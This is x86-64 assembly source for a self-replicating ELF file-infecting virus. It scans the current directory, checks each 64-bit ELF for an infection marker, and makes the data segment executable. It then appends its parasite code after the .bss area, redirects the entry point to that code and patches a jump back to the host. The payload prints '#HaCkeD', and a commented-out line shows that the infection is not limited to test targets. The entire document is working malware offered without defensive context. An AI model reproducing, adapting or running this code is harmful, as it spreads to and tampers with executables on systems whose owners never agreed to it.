section .text
	global _start

_start:
_parasiteStart:
	; # SAVE REGS
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
	pushfw

	; # BEGIN OF PARASITE CODE, MAIN FUNC
	push 0x2E ; FOLDER TO PARSE '.'
	lea rdi, [rsp] ; GET POINTER STACK ADDRESS FOR OUR PATHNAME
	call search ; PARSE AND INFECT FILES IN FOLDER '.'
	add rsp, 8 ; POP OUR FOLDER NAME IN OBLIVION

	; # RESTORE REGS
	popfw
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax
	jmp _code
	ret

set_mark:
	; # PROLOGUE
	; # STACK
	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
	mov rbp, rsp ; ALIGN RBP TO RSP

	; # BODY
	; # LSEEK, OUR FD IS STORED IN r9
	mov rdi, r9
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rsi, 9 ; OFFSET OF OUR CHECKBYTE
	mov rdx, 0 ; SEEK_SET
	syscall

	mov rax, 1 ; WRITE OUR CHECKBYTE MARK SO WE KNOW FILE IS INFECTED
	mov rdi, r9 ; FD
	push 0x01
	lea rsi, [rsp]
	mov rdx, 1 ; 1 CHAR
	syscall

	; # EPILOGUE
	; # STACK
	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
	ret ;

infect:
	; # PROLOGUE
	; # STACK
	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
	mov rbp, rsp ; ALIGN RBP TO RSP

	; # RESET THE SEEK POINTER TO START OF FILE
	mov rdi, r9 ; FD STORED IN R9
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rsi, 0 ; OFFSET OF OUR CHECKBYTE
	mov rdx, 0 ; SEEK_SET
	syscall
	; ###########################################

	; # MAKING SPACE FOR VARIABLES
	sub rsp, 8 ;	PHDR_START				RBP - 8		QWORD
	sub rsp, 8 ;	SHDR_START				RBP - 16	QWORD
	sub rsp, 8 ;	HOST_ENTRY				RBP - 24	QWORD
	sub rsp, 2 ;	PHNUM					RBP - 26	BYTE
	sub rsp, 2 ;	SHNUM					RBP - 28	BYTE
	sub rsp, 8 ;	INJECTED_OFFSET			RBP - 36	QWORD
	sub rsp, 8 ;	INJECTED_ADDRESS		RBP - 44	QWORD
	sub rsp, 4 ;	BSS_LEN					RBP - 48	DWORD
	sub rsp, 8192 ; BUF						RSP + 0		PAGE_SIZE
	; ############################

	; # READ AND SAVE HEADER INFO
	mov rax, 0 ; READ KERNEL CODE
	mov rdi, r9 ; FD
	lea rsi, [rsp] ; ADDR BUFFER
	mov rdx, 0x40 ; SIZEOF(Elf64_Ehdr)
	syscall

	; # SAVE PHDR_START
	mov rax, qword[rsp + 32]
	mov qword[rbp-8], rax ; MOVE PHDR_START

	; # SAVE SHDR_START
	mov rax, qword[rsp + 40]
	mov qword[rbp-16], rax ; MOVE SHDR_START

	; # SAVE HOST_ENTRY
	mov rax, qword[rsp + 24]
	mov qword[rbp-24], rax ; MOVE HOST_ENTRY

	; # SAVE PHNUM
	mov al, byte[rsp + 56]
	mov byte[rbp-26], al; MOVE PH_NUM

	; # SAVE SHNUM
	mov al, byte[rsp + 60]
	mov byte[rbp-28], al ; MOVE SH_NUM
	; #############################
	
	; # PARSE SEGMENTS

	; # LSEEK SYSCALL
	mov rdi, r9 ; FD
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rsi, qword[rbp-8] ; PHDR_START
	mov rdx, 0 ; SEEK_SET
	syscall

	; # READ SYSCALL
	mov rax, 0
	mov al, byte[rbp-26] ; MOV PHNUM TO RAX
	mov rcx, 0x38 ; SIZEOF Elf64_Phdr STRUCT
	mul rcx ; rax = rax * rcx
	mov rdx, rax ; NUMBER OF CHARACTER TO READ (PHDR STRUCT * NUMBER OF STRUCT)
	mov rdi, r9 ; FD
	mov rax, 0 ; READ KERNEL CODE
	lea rsi, [rsp] ; ADDR BUFFER
	syscall ; NUMBER OF BYTES READ STORED IN RAX

	mov r10, rax ; WE WILL USE r10 TO STORE NUMBER OF READ BYTES
	mov r8, 0 ; SETTING OUR COUNTER TO R8
	cmp r10, 0x38 ; CHECK IF WE HAVE READ MORE THAN 1 PHDR STRUCT
	jl _infectEnd ; IF READ BYTES < SIZEOF PHDRSTRUCT, WEIRD FILE, END PARSING
_segloop:
	cmp byte[rsp+r8], 0x1 ; CHECK Phdr->p_type, must be == 1
	jne _segIterate
	cmp byte[rsp+r8+4], 0x6 ; CHECK Phdr->p_flags, must be == 6
	jne _segIterate
	; # FOUND DATA SEGMENT

	; # CALCULATE INJECTED_OFFSET
	mov rax, qword[rsp+r8+8]
	mov qword[rbp-36], rax ; SAVE Phdr->p_offset
	mov rax, qword[rsp+r8+8+8+8+8] ; MOV Phdr->p_filesz for calculation
	add qword[rbp-36], rax ; injected_offset = Phdr->p_offset + Phdr->p_filesz;

	; # CALCULATE INJECTED_ADDRESS
	mov rax, qword[rsp+r8+16]
	mov qword[rbp-44], rax ; SAVE Phdr->p_vaddr
	mov rax, qword[rsp+r8+8+8+8+8+8] ; MOV Phdr->p_memsz for calculation
	add qword[rbp-44], rax ; injected_address = Phdr->p_vaddr + Phdr->p_memsz;

	; # CALCULATE BSS LENGTH
	mov rax, qword[rsp+r8+8+8+8+8+8] ; MOV Phdr->p_memsz for calculation
	sub rax, qword[rsp+r8+8+8+8+8] ; bss_len = Phdr->p_memsz - Phdr->p_filesz;
	mov dword[rbp-48], eax ; SAVE BSS LENGTH

	; # SET EXECUTE FLAG FOR DATA SEG
	; LSEEK SYSCALL
	; CALCULATE FLAG_OFFSET
	mov rsi, qword[rbp-8] ; PHDR_START
	add rsi, r8 ; ADD TO PHDR_START OUR CURRENT STRUCT
	add rsi, 0x04 ; ADD 0x4 TO GET FLAG OFFSET Phdr->p_flags

	mov rdi, r9 ; FD
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rdx, 0 ; SEEK_SET
	syscall
	; WRITE SYSCALL
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	push 0x00000007 ; RWE FLAG VALUE
	lea rsi, [rsp]
	mov rdx, 4 ; sizeof(uint32_t)
	syscall
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE

	; # SET ENTRY POINT AT END OF DATA SEG
	; LSEEK SYSCALL
	mov rdi, r9 ; FD
	mov rsi, 0x18 ; OFFSET FOR ENTRY POINT
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rdx, 0 ; SEEK_SET
	syscall
	; WRITE SYSCALL
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	push qword[rbp-44] ; INJECTED_ADDRESS
	lea rsi, [rsp]
	mov rdx, 8 ; sizeof(uint64_t)
	syscall
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE

	; # REDIRECT OUR VIRUS TO HOST ENTRY POINT
	; WRITE SYSCALL
	mov rax, [rbp-44] ; DIFFERENCE BETWEEN INJECTED_ADDRESS & HOST_ENTRY
	sub rax, [rbp-24]
	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE LENGTH TO DIFF
	neg rax ; NEGATE DIFFERENCE FOR RELATIVE JUMP, WE JUMP BACKWARD

	call delta_offset ; DELTA OFFSET TRICK
delta_offset: ; BECAUSE PARASITE END WILL BE DIFFERENT IN EACH HOST FILE
	pop r15
	sub r15, delta_offset ; STORE OUR DELTA OFFSET IN R15

	; mov dword[r15+_parasiteEnd-4], eax
	mov r15, rax ; SAVING OUR NEW HOST ENTRY ADDR IN R15
	; REDIRECTING OUR VIRUS BY MODIFYING THE CODE AT RUNTIME, INSANE !

	; # INCREASE DATA SEG SIZE
	; LSEEK SYSCALL
	; CALCULATE Phdr->p_filesz OFFSET
	mov rsi, qword[rbp-8] ; PHDR_START
	add rsi, r8 ; ADD TO PHDR_START OUR CURRENT STRUCT
	add rsi, 4+4+8+8+8 ; Phdr->p_filesz
	mov rdi, r9 ; FD
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rdx, 0 ; SEEK_SET
	syscall
	; # INCREASE FILESZ
	mov rax, [rsp+r8+4+4+8+8+8] ; Phdr->p_filesz
	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
	add eax, dword[rbp-48] ; ADD BSS SIZE
	push rax
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	lea rsi, [rsp]
	mov rdx, 8 ; sizeof(uint64_t)
	syscall ; WRITE SYSCALL
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
	; # INCREASE MEMSZ
	mov rax, [rsp+r8+4+4+8+8+8+8] ; Phdr->p_memsz
	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
	push rax
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	lea rsi, [rsp]
	mov rdx, 8 ; sizeof(uint64_t)
	syscall ; WRITE SYSCALL
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE

	; # INCREMENT Ehdr->shoff (section offset)
	; LSEEK SYSCALL
	mov rdi, r9 ; FD
	mov rsi, 0x28 ; OFFSET FOR SHOFF
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rdx, 0 ; SEEK_SET
	syscall
	; WRITE SYSCALL
	mov rax, qword[rbp-16] ; SHOFF
	add eax, dword[rbp-48] ; BSS_LEN
	add rax, _parasiteEnd - _parasiteStart ; PARASITE LEN
	push rax ; SHOFF = SHOFF + PARASITE LEN + BSS LEN
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	lea rsi, [rsp]
	mov rdx, 8 ; sizeof(uint64_t)
	syscall
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE

	; # WE ARE DONE MODIFYING DATA SEGMENT !

_segIterate:
	add r8, 0x38 ; GO TO NEXT PHDR_STRUCT
	cmp r8, r10 ; CHECK IF WE GO FURTHER THAN ALLOWED BYTES
	jl _segloop

	; ################

	; # PARSE SECTIONS
	; # LSEEK SYSCALL
	mov rdi, r9 ; FD
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rsi, qword[rbp-16] ; SHDR_START
	mov rdx, 0 ; SEEK_SET
	syscall

	; # READ SYSCALL
	mov rax, 0
	mov al, byte[rbp-28] ; MOV SHNUM TO RAX
	mov rcx, 0x40 ; SIZEOF Elf64_Shdr STRUCT
	mul rcx ; rax = rax * rcx
	mov rdx, rax ; NUMBER OF CHARACTER TO READ (SHDR STRUCT * NUMBER OF STRUCT)
	mov rdi, r9 ; FD
	mov rax, 0 ; READ KERNEL CODE
	lea rsi, [rsp] ; ADDR BUFFER
	syscall ; NUMBER OF BYTES READ STORED IN RAX
	mov r10, rax ; WE WILL USE r10 TO STORE NUMBER OF READ BYTES
	mov r8, 0 ; SETTING OUR COUNTER TO R8
	mov r11, 0 ; SETTING OUR FOUND ON/OFF IN R11
	cmp r10, 0x40 ; CHECK IF WE HAVE READ MORE THAN 1 SHDR STRUCT
	jl _infectEnd ; IF READ BYTES < SIZEOF SHDRSTRUCT, WEIRD FILE, END PARSING

_secLoopFirstCheck:
	cmp r14, 0x01
	jne _secLoopSndCheck
	; # BSS SECTION HAS BEEN FOUND, MUST INCREMENT THIS SECTION OFFSET CODELEN+BSS
	; # INCREMENTING sh_addr & offset by codelen + bss size
	; LSEEK SYSCALL
	; CALCULATE Shdr->sh_addr OFFSET
	mov rsi, qword[rbp-16] ; SHDR_START
	add rsi, r8 ; ADD TO SHDR_START OUR CURRENT STRUCT
	add rsi, 4+4+8 ; Shdr->sh_addr
	mov rdi, r9 ; FD
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rdx, 0 ; SEEK_SET
	syscall
	; # INCREASE SH_ADDR
	mov rax, [rsp+r8+4+4+8] ; Shdr->sh_addr
	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
	add eax, dword[rbp-48] ; ADD BSS SIZE
	push rax
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	lea rsi, [rsp]
	mov rdx, 8 ; sizeof(uint64_t)
	syscall ; WRITE SYSCALL
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE

	; # INCREASE SH_OFFSET
	mov rax, [rsp+r8+4+4+8+8] ; Phdr->sh_offset
	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE SIZE
	add eax, dword[rbp-48] ; ADD BSS SIZE
	push rax
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	lea rsi, [rsp]
	mov rdx, 8 ; sizeof(uint64_t)
	syscall ; WRITE SYSCALL
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE

	; # WE ARE DONE MODIFYING SECTIONS !

_secLoopSndCheck:
	cmp byte[rsp+r8+4], 8 ; CHECK IF Shdr->sh_type == SHT_NOBITS
	jne _secIterate
	; # FOUND BSS SECTION
	mov r14, 0x01

_secIterate:
	add r8, 0x40
	cmp r8, r10
	jl _secLoopFirstCheck

	; #############

	; # MUST APPEND BSS + OUR PARASITE CODE NOW, SPOILER: THIS IS THE BEST PART

	; # STORE POST PARASITE CODE IN BUFFER
	; # LSEEK SYSCALL
	mov rdi, r9 ; FD
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rsi, qword[rbp-36] ; INJECTED OFFSET
	mov rdx, 0 ; SEEK_SET
	syscall

	; # READ SYSCALL
	mov rdx, 8192 ; SIZE OF OUR BUFFER (2*PAGE_SIZE)
	mov rdi, r9 ; FD
	mov rax, 0 ; READ KERNEL CODE
	lea rsi, [rsp] ; ADDR BUFFER
	syscall ; NUMBER OF BYTES READ STORED IN RAX
	mov r10, rax ; WE WILL USE r10 TO STORE NUMBER OF READ BYTES
	cmp r10, 8192 ; CHECK IF THE REST OF THE FILE IS BIGGER THAN OUR BUFFER
	jge _infectEnd ; #TODO MUST NOT F*CK THE FILE WHEN IT HAPPENS

	; # LSEEK SYSCALL AGAIN
	mov rdi, r9 ; FD
	mov rax, 8 ; LSEEK KERNEL CODE
	mov rsi, qword[rbp-36] ; INJECTED OFFSET
	mov rdx, 0 ; SEEK_SET
	syscall

	; # WRITE BSS SECTION IN THE FILE NOW
	mov r8, 0 ; SETTING OUR COUNTER TO R8
	cmp dword[rbp-48], 0x00 ; IF BSS LEN == 0
	je _postLoop ; DONT WRITE BSS SECTION INTO THE FILE
_writeLoop:
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	push 0x00 ; WRITE 0
	lea rsi, [rsp]
	mov rdx, 1 ; sizeof(uint32_t)
	syscall ; WRITE SYSCALL
	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
	inc r8
	cmp r8d, dword[rbp-48] ; CHECK IF COUNTER < BSS LEN
	jl _writeLoop
_postLoop:
	; # FINISHED WRITING .bss SECTION

	; # WRITE PARASITE CODE IN THE FILE
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD

	push r15 ; SAVE OUR ENTRY POINT JUMP ADDRESS

	call delta_offset2 ; DELTA OFFSET TRICK
delta_offset2: ; BECAUSE PARASITE START WILL BE DIFFERENT IN EACH HOST FILE
	pop r15
	sub r15, delta_offset2 ; STORE OUR DELTA OFFSET IN R15

	mov rsi, _parasiteStart ; ADDR OF THE BEGINNING OF OUR PARASITE
	add rsi, r15 ; ADDING DELTA OFFSET

	pop r15; RESTORE ENTRY POINT JUMP ADDR

	mov rdx, _parasiteEnd - _parasiteStart - 4 ; SIZE OF OUR PARASITE CODE - FINAL JUMP ADDR
	syscall ; WRITE SYSCALL

	; # WRITE HOST ENTRY POINT TO REDIRECT OUR VIRUS
	mov rax, 1
	mov rdi, r9
	push r15
	lea rsi, [rsp]
	mov rdx, 0x4
	syscall
	add rsp, 8

	; REWRITE THE EOF
	mov rax, 1 ; WRITE KERNEL CODE
	mov rdi, r9 ; FD
	mov rsi, rsp ; READ BUFFER
	mov rdx, r10 ; NUMBER OF BYTES TO REACH EOF
	syscall ; WRITE SYSCALL
	; ##########################

	call set_mark ; LET OUR INFECTED MARK

_infectEnd:
	; # EPILOGUE
	; # STACK
	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
	ret ;

analyse:
	; # PROLOGUE
	; # STACK
	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
	mov rbp, rsp ; ALIGN RBP TO RSP
	mov rdi, rax ; fd
	mov rax, 0 ; READ KERNEL CODE
	; ; MAKE SPACE FOR BUFFER
	sub rsp, 10
	mov rsi, rsp
	mov rdx, 10 ; READ 10 BYTES TO REACH OUR INFECT MARK
	syscall ;
	;	0x7F	|	'E'	|	'L'	|	'F'	|	2 (64bits)
	;	0			1		2		3	|	4
	; # MUST CHECK FIRST 5 BYTES
	cmp rax, 10 ; TO BE SURE WE HAVE ENOUGH BYTES
	jne _badFile
	mov rax, qword[rsp] ; GET FIRST 8 BYTES FROM BUFFER
						;			0x00 01 01 02 46 4c 45 7f
	shl rax, 12 ; SHIFT ADD 3 0 BYTES SO WE REACH 64BITS AND NEXT BITS WILL BE ERASED
				; ->				0x10 10 24 64 c4 57 f0 00
	shl rax, 12 ; ERASE 3x CHAR SO	0x02 46 4c 45 7f 00 00 00
	mov rdi, rax
	mov rax, 0x02464c457f000000
	cmp rdi, rax ; CHECK IF GOOD FILE HEADER
	jne _badFile ; IF NOT, SKIP
	cmp byte[rsp + 9], 0x00 ; CHECK OUR INFECTION BYTE
	jne _badFile ; ALREADY INFECTED
	; # GOOD FILE, LET'S GO MA BOYZ
	call infect

_badFile:
	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
	ret ;

open_file:
	; # PROLOGUE
	; # STACK
	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
	mov rbp, rsp ; ALIGN RBP TO RSP

	; # BODY
	; # OPEN
	mov rax, 2 ; OPEN KERNEL CODE
	mov rdi, rdx ; PATHNAME
	mov r10, rdx ; FOR LATER ON INJECT
	mov rsi, 2 ; O_RDWR
	; cmp word[rdi], 0x67726174 ; TESTING PURPOSES, WONT INFECT ALL FILES FOR NOW
							  ; CHECKING FOR BEGINNING "targ" IN FILENAME
	; jne _openEnd ; IF NOT "target" FILE, SKIP
	syscall
	; # ANALYSE FILE
	cmp rax, 0 ; CHECK IF FD > 0
	jl _openEnd ; IF < 0 RET
	push rax
	mov r9, rax ; KEEP OUR FD IN R9 REG
	call analyse
	; #
	; # CLOSE
	pop rax
	mov rdi, rax
	mov rax, 3
	syscall

_openEnd:
	; # EPILOGUE
	; # STACK
	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
	ret ;

search:
	; # PROLOGUE
	; # STACK
	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
	mov rbp, rsp ; ALIGN RBP TO RSP

	; # BODY
	; # OPENAT CALL
	mov rsi, rdi ; SEARCH ARG (PATHNAME)
	mov rdi, -100 ; AT_FDCWD, start from current dir (relative path)
	mov rdx, 0x90800 ; O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY
	mov rax, 257 ; OPENAT KERNEL CODE
	syscall
	; # CHECK RETURN VALUE OF OPENAT
	cmp rax, 0
	jbe _parseEnd
	; # GETDENTS CALL
	mov rdi, rax ; FD FROM OPENAT
	mov rax, 217 ; GETDENTS64 KERNEL CODE
	sub rsp, 4096 ; ADD 1 PAGE TO THE STACK, TODO: CHECK IF CRASH WHEN FOLDER 2 BIG
				  ; LS getdents64: getdents64(3, /* 9 entries */, 32768)
				  ; BUFFER SIZE: 32768
	mov rsi, rsp ; *DIRP BUFFER ADDRESS
	mov edx, 4096 ; SPECIFY THE SIZE OF OUR BUFFER TO GETDENTS
	syscall ; RETURNS NUMBER OF BYTES READ
	; # CLOSE OPENAT FD
	push rax ; BACKUP GETDENTS RET
	mov rax, 3 ; CLOSE KERNEL CODE
	syscall
	pop rax ; GET BACK OUR RAX VALUE
	cmp rax, 0 ; CHECK GETDENTS RET VALUE
	jle _parseEnd ; GO TO END IF <= 0
	; # GO PARSE OUR RET STRUCTS
	; START OF STRUCT STACK
	mov rdi, rsp ; THE START OF OUR RET STRUCT STORED IN RDI
	; END OF STRUCT STACK
	mov r10, rax ; WE USE R10 AS OUR BUF LIMIT
	mov r8, 0 ; WE INITIALIZE OUR COUNTER IN R8

parse_dir:
	; ### VALUES ###
	; RDI = START OF CURRENT STRUCT
	; RSI = END
	; RCX = D_RECLEN OF CURRENT STRUCT
	; RDX = D_NAME OF CURRENT STRUCT
	; GET RECLEN
	mov rcx, 0
	mov cx, word[rdi + 16] ; OMFG FINALLY GOT IT
	; GET D_NAME
	lea rdx, [rdi + 19]
	push rdi
	push rsi
	push rcx
	push rdx
	push r8
	push r10
	call open_file ; OPEN FOUND FILE FOR ANALYZE/INFECT IF POSSIBLE
	pop r10
	pop r8
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	; LOOP INSTRUCTIONS
	add di, cx ; MOVING OUR CURRENT STRUCT TO THE NEXT ONE BY ADDING RECLEN
	add r8w, cx ; ADD D_RECLEN TO OUR COUNTER
	cmp r8, r10 ; CHECK IF WE WENT FURTHER THAN OUR GETDENTS RET
	jl parse_dir ; IF NOT, KEEP LOOPING
	; #########

_parseEnd:
	; # EPILOGUE
	; # STACK
	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
	ret ;

_code:
	; # SAVE REGS
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15

	; # PAYLOAD
	mov rax, 0x030A44656b436148 ; #HaCkeD\n
	push rax
	lea rsi, [rsp]
	mov rax, 1
	mov rdi, 1
	mov rdx, 7
	syscall
	pop rax

	; # RESTORE REGS
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax

	jmp 0x0000; RELATIVE JUMP WILL BE MODIFIED AT RUNTIME, INSANE !

_parasiteEnd:
